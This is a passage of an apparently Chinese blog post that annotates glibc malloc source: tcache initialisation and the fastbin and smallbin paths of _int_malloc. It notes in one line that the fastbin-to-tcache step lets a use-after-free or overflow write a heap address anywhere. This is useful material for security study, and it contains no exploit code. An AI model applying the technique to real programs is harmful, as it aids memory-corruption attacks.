class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//获取tcache_perthread_struct的size，</span></span><br><span class="line">   <span class="comment">//tcache_perthread_struct的定义如下,是一个存放tcache bin以及相应chunk数亮的结构体</span></span><br><span class="line">    <span class="comment">/*typedef struct tcache_perthread_struct</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  uint16_t counts[TCACHE_MAX_BINS];</span></span><br><span class="line"><span class="comment">  tcache_entry *entries[TCACHE_MAX_BINS];</span></span><br><span class="line"><span class="comment">&#125; tcache_perthread_struct;   */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//获取arena与victim内存</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//如果victim申请没成功，则再次调用申请，而ar_ptr似乎在arena_get_retry中被重置成了&amp;main_arena</span></span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//申请成功，初始化</span></span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是arena_get获取arena，其宏定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line">      ptr = thread_arena;<span class="comment">//获取thread_arena，这个是一个全局变量，在ptmalloc_init被初始化成了 &amp;main_arena  \</span></span><br><span class="line">      arena_lock (ptr, size);      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line">，</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lock(ptr, size) do &#123;      \ <span class="comment">//如果ptr不为空，则调用__libc_lock_lock上锁</span></span></span><br><span class="line">      <span class="keyword">if</span> (ptr)      \</span><br><span class="line">        __libc_lock_lock (ptr-&gt;mutex);      \</span><br><span class="line">      <span class="keyword">else</span>      \</span><br><span class="line">        ptr = arena_get2 ((size), <span class="literal">NULL</span>);      \<span class="comment">//若ptr不为空，则调用arena_get2获取ptr</span></span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后调用<code>_int_malloc</code>获取一个内存(这个函数也是之后分析的重点，重中之重)，之后就是给tcache赋值，然后置零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (victim)</span><br><span class="line">&#123;</span><br><span class="line">    tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">    <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把Tcache的初始化分析完之后我们再返回_libc_malloc中，然后是这句语句,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache <span class="comment">//判断返回的tc_idx是否合理，tcache是否存在，tcache相应的bin是否有free的chunk，如果是则调用tcache_get获取</span></span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    victim = tcache_get (tc_idx);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果tcache没有的话，则我们就要调用<code>_int_malloc</code>获取内存(其实观察<code>_libc_malloc</code>后面还有对是否单线程等的判断，不过最终还是调用<code>_int_malloc</code>函数进行获取chunk)</p><p>那么接下来我们着重整理一下<code>_int_malloc</code>的流程，这个函数比<code>_libc_malloc</code>要复杂许多，归根结底<code>__libc_malloc</code>只是做了一些检查初始化，以及从tcache bin中检查是否有合适块的操作，如果没有的话最后还是调用<code>_int_malloc</code>，去找其他bins中的chunk</p><h5 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h5><p>这个函数的实现差不多有700行，全贴上来有点过于低能了。所以就按照流程逐步的分析。大致来说，<code>_int_malloc</code>在接收到分配请求时，会依次从<code>fastbin</code>、<code>small bin</code>中检索，如果大小处于<code>large bin</code>当中，则会首先检查是否有fastchunk,如果有则调用<code>malloc_consolidate</code>进行堆块的前向和后向合并。然后再到<code>unsorted bin</code>中检索，若没有则再到对应size的<code>large bin</code>中检索，如果还是没有则到其他size的<code>large bin</code>中检索。如果最终还是没有，则需要到<code>top chunk</code>中检索。以下将按顺序整理malloc的整个流程。</p><h6 id="声明与初始化阶段"><a href="#声明与初始化阶段" class="headerlink" title="声明与初始化阶段"></a>声明与初始化阶段</h6><p>在函数的开头进写了一些声明与初始化操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size returns false for request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//如果size不合理，返回错误</span></span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;nb))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">    <span class="comment">//如果没有用到的arenas，调用sysmalloc从mmap得到一个chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//这里定义了一个宏，方便我们在多线程的时候保持数据一致性。其作用是从刚刚得到的空闲chunk链表指针中取出第一个空闲的chunk(victim)，并将链表头设置为该空闲chunk的下一个chunk(victim-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line">  <span class="keyword">do</span>\</span><br><span class="line">    &#123;\</span><br><span class="line">      victim = pp;\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)\</span><br><span class="line"><span class="keyword">break</span>;\</span><br><span class="line">      pp = REVEAL_PTR (victim-&gt;fd);                                     \</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (pp != <span class="literal">NULL</span> &amp;&amp; misaligned_chunk (pp)))       \</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected&quot;</span>); \</span><br><span class="line">    &#125;\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \</span><br><span class="line"> != victim);\</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="fastbin阶段"><a href="#fastbin阶段" class="headerlink" title="fastbin阶段"></a>fastbin阶段</h6><p>如果大小小于get_max_fast()，则我们会首先在fastbin中进行检索</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">  &#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">      &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>总体流程可以分为两步:</p><ul><li>找chunk</li><li>fastbin reverse into tcache</li></ul><p>首先根据大小找到对应fastbin的index，然后获取fastbinY指针 fb取其第一个chunk为victim</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">idx = fastbin_index (nb);</span><br><span class="line">mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">mchunkptr pp;</span><br><span class="line">victim = *fb;</span><br></pre></td></tr></table></figure><p>如果这个victim不为NULL(也就是说对应fastbin中有空闲的chunk)则进行检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim))) <span class="comment">//检查是否对齐</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P) <span class="comment">//根据多线程与否，取出fastbin第一个chunk，然后将fastbin设置为第二个chunk(就是把第一个链表元素取出的操作)</span></span><br><span class="line">  *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  REMOVE_FB (fb, pp, victim);</span><br><span class="line"><span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">  &#123; <span class="comment">//取出之后检查该chunk的size是否符合位于当前fastbin的index(也就是检查它的size是否被篡改了)</span></span><br><span class="line">    <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">    check_remalloced_chunk (av, victim, nb);</span><br></pre></td></tr></table></figure><p>然后便是喜闻乐见的<code>fastbin reverse into tcache</code>的操作,这个在之前的博客里面分析过。如果我们有一个UAF或者溢出，便可以利用它进行在任意地址上写一个堆地址(如果没有指针加密操作的话)。我们在这里再分析一下他的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="comment">//首先判断tcache是否错在，并且nb对应的idx小于 mp_.tcache_bins</span></span><br><span class="line">  &#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">          <span class="comment">//把剩余的fastbin中的东西挪到tcache中</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">      &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>) <span class="comment">//循环终止的条件可能有两个:1、该大小的tcache bin满了 2、fastbin 空了</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))<span class="comment">//检查对齐</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = REVEAL_PTR (tc_victim-&gt;fd); <span class="comment">//取出第一个chunk为tc_victim</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);<span class="comment">//调用tcache_put把tc_victim放入tc_idx对应的tcache bin中</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>最后将第一步得到的chunk指针进行一个chunk2mem操作，然后调用alloc_pertub，将其内容清空之后返回给用户</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure><h6 id="smallbin阶段"><a href="#smallbin阶段" class="headerlink" title="smallbin阶段"></a>smallbin阶段</h6><p>如果nb的范围在smallbin里面，则和刚刚一样进行一个搜索，同时也有一个类似<code>fastbin reverse into tcache</code>的操作。但是和在fastbin不同，smallbin是以双向链表组织的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">      stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">        &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = tc_victim-&gt;bk;</span><br><span class="line">        set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (tc_victim);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先时根据大小获取目标small bin的idx，获取bin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">idx = smallbin_index (nb);</span><br><span class="line">bin = bin_at (av, idx);</span><br></pre></td></tr></table></figure><p>判断该bin是否为空，如果不为空则进一步进行一个取出的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">bck = victim-&gt;bk; <span class="comment">//victim是该bin中最末尾的chunk，然后bck是它在该bin中的前一个chunk</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">//判断指针是否有错误，这里判断bck的后向chunk是否为victim</span></span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">set_inuse_bit_at_offset (victim, nb); <span 